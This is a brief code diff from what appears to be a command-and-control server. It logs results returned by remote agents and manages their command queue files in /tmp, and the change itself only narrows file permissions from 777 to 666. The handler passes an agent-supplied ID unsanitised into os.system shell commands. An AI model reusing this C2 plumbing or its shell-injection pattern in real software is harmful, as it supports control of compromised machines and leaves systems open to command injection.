@@ -92,9 +92,9 @@ def default(request):
 			with open('/tmp/C2CON-res.txt', 'a') as dest:
 				dest.write("Agent " + sid + " => " + str(res.decode()) + "\n")
 			
-			os.system("chmod 777 /tmp/C2CON-temp")
+			os.system("chmod 666 /tmp/C2CON-temp")
 			os.system("echo '' > /tmp/C2CON-temp")
-			os.system("chmod 777 /tmp/C2CON-cmds.txt")
+			os.system("chmod 666 /tmp/C2CON-cmds.txt")
 			os.system("cat /tmp/C2CON-cmds.txt | grep -v " + sid + " > /tmp/C2CON-temp")
 			os.system("cat /tmp/C2CON-temp > /tmp/C2CON-cmds.txt")
 			
